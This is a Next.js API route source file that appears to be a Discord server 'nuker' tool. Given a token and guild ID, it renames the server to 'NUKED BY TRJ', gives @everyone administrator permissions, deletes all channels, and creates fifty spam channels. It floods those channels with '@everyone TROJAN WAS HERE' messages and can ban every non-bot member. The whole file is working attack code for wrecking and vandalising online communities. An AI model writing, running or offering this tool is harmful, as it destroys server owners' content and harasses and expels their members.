import { NextRequest, NextResponse } from 'next/server'

export async function POST(req: NextRequest) {
  try {
    const { token, guildId, action, spamMessage, serverName } = await req.json()
    
    if (!token || !guildId || !action) {
      return NextResponse.json({ error: 'بيانات ناقصة' }, { status: 400 })
    }

    const stats = { deleted: 0, created: 0, spam_sent: 0, banned: 0 }
    
    const sleep = (ms: number) => new Promise(r => setTimeout(r, ms))
    
    const api = async (method: string, endpoint: string, body?: object) => {
      try {
        const res = await fetch(`https://discord.com/api/v10/${endpoint}`, {
          method,
          headers: { 
            'Authorization': token, 
            'Content-Type': 'application/json' 
          },
          body: body ? JSON.stringify(body) : undefined
        })
        
        if (res.status === 204) return { success: true }
        if (res.status === 429) {
          const data = await res.json().catch(() => ({}))
          await sleep(((data as any).retry_after || 1) * 1000)
          return api(method, endpoint, body)
        }
        return res.json().catch(() => ({}))
      } catch {
        return {}
      }
    }

    if (action === 'nuke') {
      // Full nuke
      // 1. Update server name
      await api('PATCH', `guilds/${guildId}`, { name: serverName || 'NUKED BY TRJ' })
      
      // 2. Get and modify @everyone role
      const roles = await api('GET', `guilds/${guildId}/roles`)
      if (Array.isArray(roles)) {
        const everyone = roles.find((r: any) => r.name === '@everyone')
        if (everyone) {
          await api('PATCH', `guilds/${guildId}/roles/${(everyone as any).id}`, { 
            permissions: '8',
            mentionable: true 
          })
        }
      }
      
      // 3. Delete all channels
      const channels = await api('GET', `guilds/${guildId}/channels`)
      if (Array.isArray(channels)) {
        for (const c of channels) {
          await api('DELETE', `channels/${(c as any).id}`)
          stats.deleted++
          await sleep(100)
        }
      }
      
      // 4. Create new channels and spam
      const names = ['nuked', 'trj', 'trojan', 'ez', 'wasted']
      for (let i = 0; i < 50; i++) {
        const ch = await api('POST', `guilds/${guildId}/channels`, { 
          name: names[i % names.length] + '-' + i, 
          type: 0 
        })
        
        if ((ch as any).id) {
          stats.created++
          // Spam messages in each channel
          for (let j = 0; j < 10; j++) {
            await api('POST', `channels/${(ch as any).id}/messages`, { 
              content: spamMessage || '@everyone TROJAN WAS HERE' 
            })
            stats.spam_sent++
            await sleep(200)
          }
        }
        await sleep(100)
      }
      
    } else if (action === 'banall') {
      // Ban all members
      let after = ''
      let totalBanned = 0
      
      while (true) {
        const members = await api('GET', `guilds/${guildId}/members?limit=1000${after ? `&after=${after}` : ''}`)
        
        if (!Array.isArray(members) || members.length === 0) break
        
        for (const m of members) {
          if ((m as any).user?.bot) continue
          
          const banResult = await api('PUT', `guilds/${guildId}/bans/${(m as any).user?.id}`, { 
            delete_message_days: 7 
          })
          
          if ((banResult as any).success !== false) {
            stats.banned++
            totalBanned++
          }
          await sleep(100)
        }
        
        if (members.length < 1000) break
        after = (members[members.length - 1] as any).user?.id
      }
      
    } else if (action === 'delete_channels') {
      // Delete all channels
      const channels = await api('GET', `guilds/${guildId}/channels`)
      if (Array.isArray(channels)) {
        for (const c of channels) {
          await api('DELETE', `channels/${(c as any).id}`)
          stats.deleted++
          await sleep(100)
        }
      }
      
    } else if (action === 'spam') {
      // Spam all text channels
      const channels = await api('GET', `guilds/${guildId}/channels`)
      if (Array.isArray(channels)) {
        const textChannels = channels.filter((c: any) => c.type === 0)
        
        for (const c of textChannels) {
          for (let i = 0; i < 20; i++) {
            await api('POST', `channels/${(c as any).id}/messages`, { 
              content: spamMessage || '@everyone TROJAN WAS HERE' 
            })
            stats.spam_sent++
            await sleep(200)
          }
        }
      }
    }

    return NextResponse.json({ success: true, stats })
  } catch (error) {
    return NextResponse.json({ error: 'خطأ في الخادم' }, { status: 500 })
  }
}
